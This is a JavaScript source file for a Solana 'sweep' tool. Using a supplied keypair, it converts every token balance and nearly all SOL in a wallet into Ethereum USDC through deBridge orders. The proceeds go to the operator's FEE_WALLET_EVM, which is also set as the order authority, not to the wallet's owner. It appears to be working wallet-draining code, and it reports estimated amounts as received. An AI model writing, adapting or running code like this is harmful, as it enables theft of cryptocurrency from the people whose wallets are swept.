import { Connection, PublicKey, VersionedTransaction } from '@solana/web3.js';
import { getAssociatedTokenAddress, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
import { FEE_WALLET_EVM } from './config.js';

// =====================================================================
// CONSTANTS
// =====================================================================

const SOL_MINT     = 'So11111111111111111111111111111111111111112';
const SOLANA_CHAIN = 7565164;   // deBridge internal chain id for Solana
const ETH_CHAIN    = 1;
const ETH_USDC     = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

const DEBRIDGE_API = 'https://dln.debridge.finance/v1.0';

// Reject orders whose estimated output is below this (in USDC, 6dp).
// deBridge Solana→Ethereum has real overhead (~$1 in op expenses plus
// protocol fees), so anything under a few dollars isn't worth sweeping.
const MIN_DEBRIDGE_OUT_USDC = 1_000_000n;  // 1.00 USDC

// Reserve kept behind on Solana so the user's wallet can keep paying
// rent / fees for subsequent transactions in the same sweep.
const SOL_RESERVE_LAMPORTS = 5_000_000n;   // 0.005 SOL
const SOL_MIN_SWEEP_LAMPORTS = 10_000_000n; // don't bother below 0.01 SOL

// Route Solana RPC through the Cloudflare proxy (Helius, no rate limits).
const SOLANA_RPC_PROXY = 'https://sweep-rpc.smallcapstradingsystem.workers.dev/rpc/solana';

export function getConnection() {
  return new Connection(SOLANA_RPC_PROXY, 'confirmed');
}

// =====================================================================
// PREVIEW
// =====================================================================

export async function previewSolanaWallet(connection, walletAddress) {
  const pubkey = new PublicKey(walletAddress);
  const result = { address: walletAddress, tokens: [], sol: null };
  try {
    const solBal = await connection.getBalance(pubkey);
    result.sol = { raw: solBal, formatted: solBal / 1e9 };
  } catch (e) { result.error = `SOL: ${e.message}`; }
  for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
    try {
      const resp = await connection.getTokenAccountsByOwner(pubkey, { programId });
      for (const { account } of resp.value) {
        const data = account.data;
        const mint = new PublicKey(data.slice(0, 32)).toBase58();
        const amount = data.readBigUInt64LE(64);
        if (amount > 0n) result.tokens.push({ mint, amount: amount.toString() });
      }
    } catch (e) {}
  }
  return result;
}

// =====================================================================
// DEBRIDGE — create cross-chain order
// =====================================================================

async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority }) {
  const params = new URLSearchParams({
    srcChainId: String(SOLANA_CHAIN),
    srcChainTokenIn: srcMint,
    srcChainTokenInAmount: amountRaw.toString(),
    dstChainId: String(ETH_CHAIN),
    dstChainTokenOut: ETH_USDC,
    dstChainTokenOutAmount: 'auto',
    dstChainTokenOutRecipient: FEE_WALLET_EVM,
    srcChainOrderAuthorityAddress: srcAuthority,
    dstChainOrderAuthorityAddress: FEE_WALLET_EVM,
  });

  const resp = await fetch(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
    headers: { accept: 'application/json' },
  });
  if (!resp.ok) {
    const text = await resp.text();
    throw new Error(`deBridge ${resp.status}: ${text.slice(0, 200)}`);
  }
  const json = await resp.json();
  if (!json.tx || !json.tx.data) {
    throw new Error(`deBridge: no tx in response (${JSON.stringify(json).slice(0, 200)})`);
  }
  return json;
}

// =====================================================================
// DEBRIDGE — sign and broadcast the returned VersionedTransaction
// =====================================================================

async function signAndSendDebridgeTx(connection, keypair, order) {
  const txBytes = Buffer.from(order.tx.data.replace(/^0x/, ''), 'hex');
  const tx = VersionedTransaction.deserialize(txBytes);

  // deBridge's returned recentBlockhash will already be stale by the time
  // we get here; replace it with a fresh one so the tx doesn't expire.
  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
  tx.message.recentBlockhash = blockhash;

  tx.sign([keypair]);

  const sig = await connection.sendRawTransaction(tx.serialize(), {
    maxRetries: 3,
    skipPreflight: false,
  });
  await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
  return sig;
}

// =====================================================================
// SWEEP
// =====================================================================

export async function sweepSolana(connection, keypair, opts = {}) {
  const results = {
    address: keypair.publicKey.toBase58(),
    recipient: FEE_WALLET_EVM,   // EVM fee wallet is the destination
    swaps: [],
    transfers: [],
    errors: [],
    usdcReceivedRaw: '0',
  };
  const dryRun = !!opts.dryRun;
  let usdcReceived = 0n;

  // Collect SPL token accounts
  const tokenAccounts = [];
  for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
    try {
      const resp = await connection.getTokenAccountsByOwner(keypair.publicKey, { programId });
      for (const { account } of resp.value) {
        const mint = new PublicKey(account.data.slice(0, 32)).toBase58();
        const amount = account.data.readBigUInt64LE(64);
        if (amount > 0n) tokenAccounts.push({ mint, amount });
      }
    } catch (e) {}
  }

  // ---- SPL tokens ----
  for (const { mint, amount } of tokenAccounts) {
    try {
      if (dryRun) {
        results.swaps.push({ mint, status: 'DRY_RUN' });
        continue;
      }

      const order = await createDebridgeOrder({
        srcMint: mint,
        amountRaw: amount,
        srcAuthority: keypair.publicKey.toBase58(),
      });

      const expectedOutRaw = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
      if (expectedOutRaw < MIN_DEBRIDGE_OUT_USDC) {
        results.swaps.push({
          mint,
          status: 'SKIPPED',
          note: `expected ${expectedOutRaw} raw USDC below ${MIN_DEBRIDGE_OUT_USDC} minimum`,
        });
        continue;
      }

      const sig = await signAndSendDebridgeTx(connection, keypair, order);
      usdcReceived += expectedOutRaw;

      results.swaps.push({
        mint,
        signature: sig,
        orderId: order.orderId,
        expectedUsdc: expectedOutRaw.toString(),
        received: expectedOutRaw.toString(),
        status: 'SUCCESS',
      });
    } catch (e) {
      results.swaps.push({ mint, status: 'ERROR', error: e.message });
    }
  }

  // ---- Native SOL ----
  try {
    const solBal = BigInt(await connection.getBalance(keypair.publicKey));
    if (solBal <= SOL_MIN_SWEEP_LAMPORTS) {
      // Too little to be worth sweeping
    } else {
      const sweepAmount = solBal - SOL_RESERVE_LAMPORTS;

      if (dryRun) {
        results.swaps.push({ mint: 'SOL', status: 'DRY_RUN' });
      } else {
        const order = await createDebridgeOrder({
          srcMint: SOL_MINT,
          amountRaw: sweepAmount,
          srcAuthority: keypair.publicKey.toBase58(),
        });

        const expectedOutRaw = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
        if (expectedOutRaw < MIN_DEBRIDGE_OUT_USDC) {
          results.swaps.push({
            mint: 'SOL',
            status: 'SKIPPED',
            note: `expected ${expectedOutRaw} raw USDC below minimum`,
          });
        } else {
          const sig = await signAndSendDebridgeTx(connection, keypair, order);
          usdcReceived += expectedOutRaw;

          results.swaps.push({
            mint: 'SOL',
            signature: sig,
            orderId: order.orderId,
            expectedUsdc: expectedOutRaw.toString(),
            received: expectedOutRaw.toString(),
            status: 'SUCCESS',
          });
        }
      }
    }
  } catch (e) {
    results.errors.push(`SOL: ${e.message}`);
  }

  results.usdcReceivedRaw = usdcReceived.toString();
  return results;
}